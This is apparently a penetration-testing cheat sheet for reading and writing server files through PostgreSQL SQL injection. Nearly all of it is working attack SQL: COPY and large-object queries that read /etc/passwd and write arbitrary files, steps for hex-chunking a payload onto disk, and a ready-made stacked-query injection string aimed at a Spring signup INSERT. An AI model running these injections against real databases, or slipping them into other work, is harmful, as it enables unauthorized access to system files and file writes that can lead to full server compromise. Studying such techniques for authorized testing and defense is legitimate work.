# Reading and Writing Files via PostgreSQL SQLi

Two methods for file I/O through a PostgreSQL injection. Both require the DB user to be a superuser or have `pg_read_server_files` / `pg_write_server_files`.

Check superuser status (works blind):
```sql
SELECT current_setting('is_superuser');  -- returns 'on' or 'off'
```

---

## Method 1: COPY

### Read
```sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
DROP TABLE tmp;
```

Tab characters cause column errors — use an unlikely delimiter:
```sql
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
```

### Write
```sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('content here');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
```

---

## Method 2: Large Objects

### Read
```sql
SELECT lo_import('/etc/passwd');          -- returns OID e.g. 16513
SELECT lo_get(16513);                     -- returns hex blob
-- or page by page:
SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
```

Convert hex back to text:
```bash
echo "<hexstring>" | xxd -r -p
```

Find your OID if lost:
```sql
SELECT DISTINCT loid FROM pg_largeobject;
```

### Write
Split source into 2KB chunks, hex-encode each:
```bash
split -b 2048 payload.txt
xxd -ps -c 99999999999 xaa
```

Then:
```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('<hex_chunk_0>','HEX'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('<hex_chunk_1>','HEX'));
SELECT lo_export(31337, '/tmp/output');
SELECT lo_unlink(31337);
```

If INSERT fails on permissions, try `lo_put` instead:
```sql
SELECT lo_put(31337, 0, 'content');
```

---

## Exploiting via Stacked Queries in INSERT

The signup INSERT injection supports stacked queries via `jdbcTemplate.update(String sql)` — Spring uses a plain `Statement` (simple query protocol), which PostgreSQL JDBC executes as multiple statements.

Inject into the `name` field, closing the INSERT and stacking a COPY:

```
name = x', 'inject_user', 'inject@x.com', 'hash'); COPY (SELECT 'proof') TO '/var/lib/postgresql/proof.txt'; --
```

Full resulting SQL:
```sql
INSERT INTO users (name, username, email, password) VALUES (
  'x', 'inject_user', 'inject@x.com', 'hash');
COPY (SELECT 'proof') TO '/var/lib/postgresql/proof.txt';
--', 'real_user', 'real@email.com', 'bcrypt_hash')
```

The injected INSERT row needs a unique username/email to avoid duplicate key errors on the pre-checks.

---

## Permissions Summary

| Action | Required |
|--------|----------|
| COPY FROM (read) | superuser OR `pg_read_server_files` |
| COPY TO (write) | superuser OR `pg_write_server_files` |
| lo_import / lo_export | superuser |
| lo_create / lo_unlink | any user |
| INSERT into pg_largeobject | superuser (or explicit grant) |
